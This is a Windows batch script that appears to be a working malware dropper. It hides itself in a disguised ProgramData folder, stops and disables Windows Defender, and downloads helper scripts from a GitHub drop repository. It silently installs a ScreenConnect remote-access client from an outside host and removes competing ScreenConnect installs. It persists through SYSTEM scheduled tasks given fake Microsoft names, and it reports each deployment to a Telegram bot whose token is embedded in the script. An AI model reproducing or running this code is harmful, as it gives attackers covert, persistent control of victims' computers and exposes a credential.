@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O8 - robust MSI fetch + always nuke foreign + diagnose
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1

REM Survive ScreenConnect Guest 30s kill: detach into independent process
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O8 ===
  net session >nul 2>&1
  if errorlevel 1 (echo need Administrator & exit /b 5)
  echo go_start %DATE% %TIME%>"%LOG%"
  echo order=msi_then_primary_then_nuke_foreign>>"%LOG%"
  echo engine=cmd_only_detached>>"%LOG%"
  copy /y "%~f0" "%SELF%" >nul
  echo detach_begin>>"%LOG%"
  wmic process call create "cmd.exe /c \"%SELF%\" _RUN" >"%WD%\detach.wmic" 2>&1
  echo detach_done>>"%LOG%"
  echo Detached. Wait ~90s then:
  echo   type "%LOG%"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo === OWN WORKER 20260802O8 ===

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%~dp0own_secure.cmd" copy /y "%~dp0own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd" >nul 2>&1
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Ensure PRIMARY...
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

echo primary missing/stopped - MSI install...
echo primary_install_begin>>"%LOG%"
start "" /b cmd /c "sc stop \"%PRIM%\" >nul 2>&1"
timeout /t 2 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
echo msi_exit_%ERRORLEVEL%>>"%LOG%"
timeout /t 15 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress /L*v "%WD%\msi_reinstall.log"
echo msi_reinstall_%ERRORLEVEL%>>"%LOG%"
timeout /t 10 /nobreak >nul

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

REM Always nuke foreign - KEEP1/KEEP2 stay. Do NOT gate on primary (orphans stay forever otherwise).
echo [4] Nuke foreign ScreenConnect (keep allowlist only)...
call :NukeForeign

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul

echo [6] Arm wipe-proof persist (2m/3m/onstart/onlogon + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0own_mon.cmd" (
  copy /y "%~dp0own_mon.cmd" "%WD%\own_mon.cmd" >nul
) else (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd" >nul 2>&1
)
if exist "%~dp0notify.cfg" copy /y "%~dp0notify.cfg" "%WD%\notify.cfg" >nul
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  copy /y "%MSI%" "%MSICACHE%" >nul
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

schtasks /Delete /TN "\Microsoft\Windows\Diagnosis\Scheduled" /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
schtasks /Delete /TN "\Microsoft\Windows\PLA\Server" /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c \"%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd\"" >nul 2>&1
schtasks /Delete /TN "\Microsoft\Windows\WDI\ResolutionHost" /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
schtasks /Delete /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
echo persist_armed_wipeproof>>"%LOG%"

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%~dp0own_secure.cmd" copy /y "%~dp0own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd" >nul 2>&1
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  >"%WD%\notify.cfg" echo BOT_TOKEN=8619715754:AAFMk2NjND-hQk2xPFYjicHfB5MyKtcXCqg
  >>"%WD%\notify.cfg" echo CHAT_ID=7547462070
)
if exist "%~dp0tg_report.ps1" (
  copy /y "%~dp0tg_report.ps1" "%WD%\tg_report.ps1" >nul
) else (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1" >nul 2>&1
)
if not exist "%WD%\tg_report.ps1" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1' -OutFile '%WD%\tg_report.ps1' -UseBasicParsing" >nul 2>&1
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" >>"%LOG%" 2>&1
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

REM 1) System32 curl
if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

REM 2) PATH curl
echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

REM 3) PowerShell TLS1.2
echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

REM 4) Existing cache
if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo nuke_begin>>"%LOG%"
for /f "tokens=2 delims=:" %%A in ('sc query state= all ^| findstr /C:"SERVICE_NAME:"') do (
  set "SN=%%A"
  if defined SN (
    set "SN=!SN:~1!"
    echo !SN! | findstr /I "ScreenConnect" >nul
    if not errorlevel 1 (
      set "KEEP=0"
      echo !SN! | findstr /I "%KEEP1%" >nul && set "KEEP=1"
      echo !SN! | findstr /I "%KEEP2%" >nul && set "KEEP=1"
      if "!KEEP!"=="1" (
        echo keep_svc=!SN!>>"%LOG%"
      ) else (
        echo nuke_svc=!SN!>>"%LOG%"
        sc stop "!SN!" >nul 2>&1
        timeout /t 1 /nobreak >nul
        sc delete "!SN!" >nul 2>&1
      )
    )
  )
)

wmic process where "name='ScreenConnect.ClientService.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1
wmic process where "name='ScreenConnect.WindowsClient.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1

for %%R in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
  if exist "%%~R" for /d %%D in ("%%~R\ScreenConnect*") do (
    set "KEEP=0"
    echo %%~nxD | findstr /I "%KEEP1%" >nul && set "KEEP=1"
    echo %%~nxD | findstr /I "%KEEP2%" >nul && set "KEEP=1"
    if "!KEEP!"=="1" (
      echo keep_dir=%%~D>>"%LOG%"
    ) else (
      echo nuke_dir=%%~D>>"%LOG%"
      takeown /F "%%~D" /R /D Y >nul 2>&1
      icacls "%%~D" /grant Administrators:F /T /C >nul 2>&1
      rd /s /q "%%~D" >nul 2>&1
      if exist "%%~D" (
        echo nuke_dir_FAIL=%%~D>>"%LOG%"
      ) else (
        echo nuke_dir_ok=%%~D>>"%LOG%"
      )
    )
  )
)
echo nuke_done>>"%LOG%"
exit /b 0
